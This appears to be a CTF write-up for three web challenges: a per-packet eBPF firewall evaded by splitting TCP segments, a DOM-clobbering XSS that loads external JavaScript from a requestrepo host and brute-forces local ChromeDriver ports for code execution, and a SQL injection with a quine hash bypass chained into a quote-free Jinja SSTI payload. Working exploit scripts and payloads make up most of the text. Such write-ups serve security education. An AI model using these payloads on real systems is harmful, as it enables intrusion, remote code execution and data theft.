@@ -1,0 +1,266 @@
+---
+title: UOFCTF 2025 Web challenge 
+description: "Date: January 11, 2026"
+date: 2026-01-12
+tags:
+  - writeup
+category: web
+draft: false
+---
+
+# Firewall
+
+- eBPF tc filter on both ingress and egress scans each TCP packet payload; drops any packet containing the 4-byte keyword
+flag or the character %, and it blocks IPv6 and all fragmented IPv4 traffic (tc hooks installed in [entrypoint.sh](http://entrypoint.sh/)).
+- It only inspects per-packet data (no TCP reassembly), so splitting the keyword across packets avoids detection.
+
+Exploit idea:
+
+- Requests/Responses get dropped whenever a single packet carries flag, so we bypass by forcing the keyword to be split
+across packets and by reading the response in small slices so no single packet ever contains flag.
+
+```python
+#!/usr/bin/env python3
+import socket
+import time
+import re
+import sys
+
+HOST = "35.227.38.232"
+PORT = 5000
+
+PATH_PART1 = b"/f"
+PATH_PART2 = b"lag.html"
+
+RECV_TIMEOUT = 5
+MAX_RETRIES = 3
+
+def make_socket():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_MAXSEG, 3)
+    except OSError:
+        pass
+    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+    sock.settimeout(RECV_TIMEOUT)
+    return sock
+
+def send_split_request(sock, method, headers):
+    part1 = method + b" " + PATH_PART1
+    part2 = PATH_PART2 + b" HTTP/1.1\r\n" + headers + b"\r\n"
+    sock.sendall(part1)
+    time.sleep(0.05)
+    sock.sendall(part2)
+
+def recv_all(sock):
+    data = b""
+    try:
+        while True:
+            chunk = sock.recv(4096)
+            if not chunk:
+                break
+            data += chunk
+    except socket.timeout:
+        return b""
+    return data
+
+def http_request(method, headers):
+    for _ in range(MAX_RETRIES):
+        sock = None
+        try:
+            sock = make_socket()
+            sock.connect((HOST, PORT))
+            send_split_request(sock, method, headers)
+            data = recv_all(sock)
+            sock.close()
+            if data:
+                return data
+        except Exception:
+            try:
+                if sock:
+                    sock.close()
+            except Exception:
+                pass
+        time.sleep(0.05)
+    return b""
+
+def parse_body(resp):
+    if b"\r\n\r\n" not in resp:
+        return b""
+    return resp.split(b"\r\n\r\n", 1)[1]
+
+def head_content_length():
+    resp = http_request(b"HEAD", b"Host: x\r\nConnection: close\r\n")
+    if resp:
+        m = re.search(rb"Content-Length:\s*(\d+)", resp, re.IGNORECASE)
+        if m:
+            return int(m.group(1))
+    # Fallback: Range 0-0 and read Content-Range
+    resp = http_request(b"GET", b"Host: x\r\nRange: bytes=0-0\r\nConnection: close\r\n")
+    if not resp:
+        return None
+    m = re.search(rb"Content-Range:\s*bytes\s+\d+-\d+/(\d+)", resp, re.IGNORECASE)
+    if not m:
+        return None
+    return int(m.group(1))
+
+def get_range(start, end):
+    headers = b"Host: x\r\nRange: bytes=%d-%d\r\nConnection: close\r\n" % (start, end)
+    resp = http_request(b"GET", headers)
+    if not resp:
+        return None
+    return parse_body(resp)
+
+def fetch_all(length):
+    buf = bytearray(b"?" * length)
+    stack = [(0, length - 1)]
+    while stack:
+        start, end = stack.pop()
+        if start > end:
+            continue
+        body = get_range(start, end)
+        if body is None:
+            if start == end:
+                continue
+            mid = (start + end) // 2
+            stack.append((start, mid))
+            stack.append((mid + 1, end))
+            continue
+        expected = end - start + 1
+        if len(body) != expected:
+            if start == end:
+                continue
+            mid = (start + end) // 2
+            stack.append((start, mid))
+            stack.append((mid + 1, end))
+            continue
+        buf[start : end + 1] = body
+    return bytes(buf)
+
+def main():
+    length = head_content_length()
+    if length is None:
+        print("[-] Failed to get Content-Length. Try running again or use scapy fallback.")
+        sys.exit(1)
+
+    data = fetch_all(length)
+    text = data.decode(errors="replace")
+    m = re.search(r"uoftctf\\{[^}]+\\}", text)
+    if m:
+        print("FLAG:", m.group(0))
+        return
+
+    if b"?" in data:
+        print("[-] Some bytes still missing. Re-run to fill gaps.")
+    else:
+        print("[-] Flag not found in response.")
+
+if __name__ == "__main__":
+    main()
+
+```
+
+# Pasteboard
+
+- Core bug: DOM clobber in src/static/app.js + src/templates/view.html. The viewer uses window.renderConfig/ window.errorReporter to control render mode and error reporting. Because user content is injected as raw HTML (&#123;&#123; msg| safe &#125;&#125;), you can inject `<form id="renderConfig" name="renderConfig">` etc., so window.renderConfig becomes a form element without .mode. That throws in the try block, drops into handleError(), which then reads window.errorReporter.path (or its form input) and loads it as a script source.
+- Report gate bypass: /report (src/app.py) only accepts same-origin URLs and requires a path; sending a relative path to your stored note is allowed. The headless bot (src/bot.py) visits it with the flag in its Chrome session.
+
+**Exploit flow (mirrors solve.py):**
+
+1. Create a note with the DOM-clobber payload that sets errorReporter.path to your external JS (requestrepo).
+2. Submit /report with the note path (relative, same origin), so the bot opens it.
+3. When the viewer errors, it fetches your external JS and executes it in the bot’s browser.
+4. That JS CSRFs internal services to exfiltrate the flag.
+
+**Payload details**
+
+- The note body used in solve.py:
+    
+    ```python
+    <form id="renderConfig" name="renderConfig"></form>
+    
+    <form id="errorReporter" name="errorReporter">
+    
+    <input id="path" name="path" value="https://b4qz1ri8.requestrepo.com/index.js">
+    
+    </form>
+    ```
+    
+- Host your malicious JS at your requestrepo (https://x6kx8cez.requestrepo.com/index.js); the provided CSRF-to-RCE brute
+    
+    ```jsx
+    <script>
+      const options = {
+        mode: "no-cors",
+        method: "POST",
+        body: JSON.stringify({
+          capabilities: {
+            alwaysMatch: {
+              "goog:chromeOptions": {
+                binary: "/usr/local/bin/python",
+                args: ["-c", "__import__('os').system('id > /tmp/pwned')"],
+              },
+            },
+          },
+        }),
+      };
+    
+      for (let port = 32768; port < 61000; port++) {
+        fetch(`http://127.0.0.1:${port}/session`, options);
+      }
+    </script>
+    
+    ```
+    
+
+# No quotes 3
+
+## Bug & Constraints
+
+- `/login` builds SQL with f-strings and only blocks `'`, `"` and `.`.
+- Query: `SELECT username,password FROM users WHERE username=('u') AND password=('p')`.
+- Auth check: `row[0] == username` and `sha256(input_password) == row[1]`.
+- SSTI at `/home`: `render_template_string(... % session["user"])`.
+- SQLi via backslash: username ending with `\` escapes its quote; inject via password. Stacked queries are off; UNION works.
+
+## SSTI Payload (no dots/quotes)
+
+```python
+{{(cycler|attr(dict(__init__=1)|join)|attr(dict(__globals__=1)|join))[dict(__builtins__=1)|join][dict(__import__=1)|join](dict(os=1)|join)|attr(dict(popen=1)|join)(request|attr(dict(path=1)|join)|first~dict(readflag=1)|join)|attr(dict(read=1)|join)()}}
+
+```
+
+Username used: `SSTI + "\\"` (must end with backslash).
+
+## Hash Bypass via Quine
+
+Goal: make `row[0] == username` and `row[1] == sha256(password_input)` without fixed-point search.
+
+Template `T` (contains one `$` placeholder):
+
+```python
+) UNION ALL SELECT CONVERT(0x<hex(USERNAME)> USING utf8mb4),
+LOWER(SHA2(REPLACE(@t:=CONVERT($ USING utf8mb4),0x24,CONCAT(0x3078,LOWER(HEX(@t)))),256)) #
+
+```
+
+Build the actual password client-side:
+
+- `hexT = hex(T)`
+- `PASSWORD = T.replace("$", "0x" + hexT)`
+
+At runtime:
+
+- `@t := CONVERT($ USING utf8mb4)` sets `@t` to the full password string you sent.
+- `REPLACE(..., 0x24, CONCAT(0x3078, LOWER(HEX(@t))))` swaps the literal `$` with the hex literal of the entire password, yielding exactly the input string again.
+- `SHA2(...,256)` now hashes the same string the Flask code hashes, so the equality passes.
+
+## Exploit Flow
+
+1. POST `/login` with:
+    - `username = SSTI + "\\"`
+    - `password = PASSWORD` (the quine above with hex(USERNAME) and hex(T) filled in)
+2. Server UNIONs:
+    - `row[0] = username` (SSTI)
+    - `row[1] = sha256(password_input)` computed via quineAuth passes; session user = SSTI.
+3. GET `/home` → SSTI triggers → `/readflag` output.
